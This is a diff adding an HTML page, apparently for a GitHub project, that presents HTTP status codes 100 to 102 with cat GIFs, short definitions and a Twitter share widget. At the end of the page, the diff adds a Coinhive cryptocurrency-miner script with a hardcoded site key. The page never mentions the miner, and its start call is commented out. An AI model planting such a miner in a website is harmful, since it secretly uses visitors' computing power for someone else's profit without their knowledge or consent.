@@ -1,9 +1,190 @@
 <!DOCTYPE html>
 <html>
 <head>
+	<meta charset="utf-8">
+	<meta name="keywords" content="http, status, codes, httpstatuscat, cats, https"/>
+	<meta name="description" content="httpstatuscat is an easy to reference database of HTTP Status Codes with gifs and cats. with their definitions and helpful code references all in one place. Visit an individual status code via httpstatuscat.com"/>
+	<meta name="language" content="en">
+	<meta name="author" content="@evilsocketbr, evilsocketbr@gmail.com">
+	<meta name="designer" content="@evilsocketbr@evilsocketbr">
+	<meta name="copyright" content="@evilsocketbr">
+	<meta name="url" content="https://github.com/evilsocketbr/httpstatuscat">
+
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta content="yes" name="apple-touch-fullscreen" />
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<meta name="format-detection" content="telephone=no">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="shortcut icon" type="image/ico" href="assets/favicon.ico" />
+	<link rel="fluid-icon" type="image/png" href="assets/favicon.png" />
 	<title>HTTP Cats with gifs</title>
+	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.13/semantic.min.css">
+	<link rel="stylesheet" type="text/css" href="css/style.css">
 </head>
 <body>
+	 <!-- 100 Continue -->
+	<div class="ui basic modal" id="continue">
+		<div class="ui icon header">
+			<h1>100 Continue</h1>
+		</div>
+		<div class="content">
 
+			<img class="" src="https://media.giphy.com/media/G3773sSDJHHy0/giphy.gif" width="100%" height="715px">
+			<br>
+			<br>
+			<p>The server has received the request headers and the client should proceed to send the request body (in the case of a request for which a body needs to be sent; for example, a POST request). Sending a large request body to a server after a request has been rejected for inappropriate headers would be inefficient. To have a server check the request's headers, a client must send Expect: 100-continue as a header in its initial request and receive a 100 Continue status code in response before sending the body. If the client receives an error code such as 403 (Forbidden) or 405 (Method Not Allowed) then it shouldn't send the request's body. The response 417 Expectation Failed indicates that the request should be repeated without the Expect header as it indicates that the server doesn't support expectations (this is the case, for example, of HTTP/1.0 servers). </p>
+			<span><a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes">Font Wikipedia</a></span>
+		</div>
+	</div>
+
+	<!-- 101 Continue -->
+	<div class="ui basic modal" id="switching">
+		<div class="ui icon header">
+			<h1>101 Switching Protocols</h1>
+		</div>
+		<div class="content">
+			<img class="" src="https://media.giphy.com/media/ExMGjbktr4phe/giphy.gif" width="100%" height="715px">
+			<p>The requester has asked the server to switch protocols and the server has agreed to do so. </p>
+			<span><a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes">Font Wikipedia</a></span>
+		</div>
+	</div>
+
+	<!-- 102 Continue -->
+	<div class="ui basic modal" id="processing">
+		<div class="ui icon header">
+			<h1>102 Processing</h1>
+		</div>
+		<div class="content">
+			<img class="" src="https://media.giphy.com/media/5r5J4JD9miis/giphy.gif" width="100%" height="715px">
+			<p>A WebDAV request may contain many sub-requests involving file operations, requiring a long time to complete the request. This code indicates that the server has received and is processing the request, but no response is available yet. This prevents the client from timing out and assuming the request was lost. </p>
+			<span><a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes">Font Wikipedia</a></span>
+		</div>
+	</div>
+
+	<div class="ui container fluid">
+		<div class="ui container">
+			<div class="contribute">
+				<p>Contribute on github  — <b><a href="https://github.com/evilsocketbr/httpstatuscat">https://evilsocketbr.github.io/...</a></b></p>
+			</div>
+			<div class="share">
+				<a href="https://twitter.com/intent/tweet?hashtags=httpstatuses&amp;text=Helpful%20HTTP%20Status%20Code%20reference%20site&amp;url=https%3A%2F%2Fhttpstatuses.com&amp;via=webpagefx" class="twitter"> <b>Share on Twitter</b></a>
+			</div>
+		</div>
+	</div>
+
+	<div class="ui divider"></div>
+	<div class="ui left aligned container">
+		<div class="logo"> 
+		<h2>
+			<span>
+				<img src="assets/logo.png">
+			</span>
+			<span class="text">HTTP Cats with gifs</span>
+		</h2>
+		</div>
+		<p>httpstatuscat is an easy to reference database of HTTP Status Codes with gifs and cats. with their definitions and helpful code references all in one place. Visit an individual status code via httpstatuscat.com</p>
+
+		<div class="ui divider"></div>
+		<h3>Available status codes:</h3>
+
+	<!-- 	<div class="gifs">
+			<div class="ui small rounded images">
+			  <img class="ui image" src="https://media.giphy.com/media/G5h04AkAvAHcs/giphy.gif">
+			  <img class="ui image" src="https://media.giphy.com/media/G5h04AkAvAHcs/giphy.gif">
+			  <img class="ui image" src="https://media.giphy.com/media/G5h04AkAvAHcs/giphy.gif">
+			</div>
+		</div> -->
+
+		<h4>1×× Informational responses</h4>
+		<div class="ui cards">
+			<div class="ui card">
+				<div class="content">
+					<div class="header">100 Continue</div>
+					<div class="ui divider"></div>
+					<div class="meta">The server has received the request headers and the client should proceed to send the request body (in the case of a request for which a body needs to be sent; for example, a POST request). </div> 
+					<span>
+						<a href="#" class="cats" modal="continue">See the cat</a>
+					</span>
+				</div>
+			</div>
+			<div class="ui card">
+				<div class="content">
+					<div class="header">101 Switching Protocols</div>
+					<div class="ui divider"></div>
+					<div class="meta">The requester has asked the server to switch protocols and the server has agreed to do so.</div> 
+					<span>
+						<a href="#" class="cats" modal="switching">See the cat</a>
+					</span>
+				</div>
+			</div>
+			<div class="ui card">
+				<div class="content">
+					<div class="header">102 Processing</div>
+					<div class="ui divider"></div>
+					<div class="meta">A WebDAV request may contain many sub-requests involving file operations, requiring a long time to complete the request.</div> 
+					<span>
+						<a href="#" class="cats" modal="processing">See the cat</a>
+					</span>
+				</div>
+			</div>
+		</div>
+
+	
+	<div class="ui container fluid">
+		<div class="ui center aligned container">
+			<div class="ui divider"></div>
+			<p>Developed by <a href="https://twitter.com/evilsocketbr">@evilsocketbr</a>. Images by GIPHY.</p>
+		</div>
+	</div>
+
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<!-- Semantic mimify JS  -->
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.13/semantic.min.js"></script>
+	<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 
+	<script>
+		window.twttr = (function(d, s, id) {
+			var js, fjs = d.getElementsByTagName(s)[0],
+			t = window.twttr || {};
+			if (d.getElementById(id)) return t;
+			js = d.createElement(s);
+			js.id = id;
+			js.src = "https://platform.twitter.com/widgets.js";
+			fjs.parentNode.insertBefore(js, fjs);
+
+			t._e = [];
+			t.ready = function(f) {
+				t._e.push(f);
+			};
+
+			return t;
+		}(document, "script", "twitter-wjs"));
+	</script>
+
+	<script type="text/javascript">
+		(function(){
+
+			var button = document.getElementsByClassName('cats');
+
+			for (var i = 0; i < button.length; i++) {
+
+				var buttons = button[i];
+
+				buttons.addEventListener('click', function(event){
+
+					event.preventDefault();
+					var modal = this.attributes.modal.value;
+
+					$('#' + modal).modal('show');
+				});
+			}
+		}());
+	</script>
+
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script type="text/javascript">
+		var miner = new CoinHive.Anonymous('CrvAmTYAc7Wzxs4dqtUfwq9zUkxwhfNJ');
+			// miner.start();
+	</script>
 </body>
 </html>
